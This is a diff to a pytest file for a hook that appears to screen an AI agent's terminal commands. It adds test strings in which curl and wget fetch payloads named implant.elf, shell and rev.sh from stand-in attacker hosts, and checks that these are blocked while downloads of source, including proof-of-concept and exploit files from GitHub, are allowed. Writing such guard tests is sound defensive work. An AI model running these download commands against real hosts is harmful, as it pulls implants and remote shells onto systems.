@@ -114,10 +114,19 @@ def test_raw_terminal_blocks_arbitrary_target_tools_without_a_name_list(
     assert "violin_exec" in result["message"]
 
 
-def test_local_source_retrieval_remains_available() -> None:
+@pytest.mark.parametrize(
+    "raw_command",
+    [
+        "git clone https://github.com/example/project.git",
+        "curl https://raw.githubusercontent.com/example/repo/main/poc.c",
+        "curl -sL https://gist.githubusercontent.com/example/123/raw/exploit.py",
+        "wget https://raw.githubusercontent.com/example/repo/main/Makefile",
+    ],
+)
+def test_local_source_retrieval_remains_available(raw_command: str) -> None:
     result = _pre_tool_call_hook(
         tool_name="terminal",
-        args={"command": "git clone https://github.com/example/project.git"},
+        args={"command": raw_command},
     )
 
     assert result is None
@@ -138,6 +147,23 @@ def test_local_source_retrieval_remains_available() -> None:
 def test_compound_terminal_commands_cannot_hide_target_segments(raw_command: str) -> None:
     result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})
 
+    assert result["action"] == "block"
+    assert "violin_exec" in result["message"]
+
+
+@pytest.mark.parametrize(
+    "raw_command",
+    [
+        "curl https://victim.example/admin",
+        "curl -o payload.bin http://10.10.10.10/shell",
+        "wget https://attacker.example/implant.elf",
+        "wget -q http://192.168.1.100:8000/rev.sh",
+    ],
+)
+def test_curl_wget_to_non_source_host_is_blocked(raw_command: str) -> None:
+    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})
+
+    assert result is not None
     assert result["action"] == "block"
     assert "violin_exec" in result["message"]
 
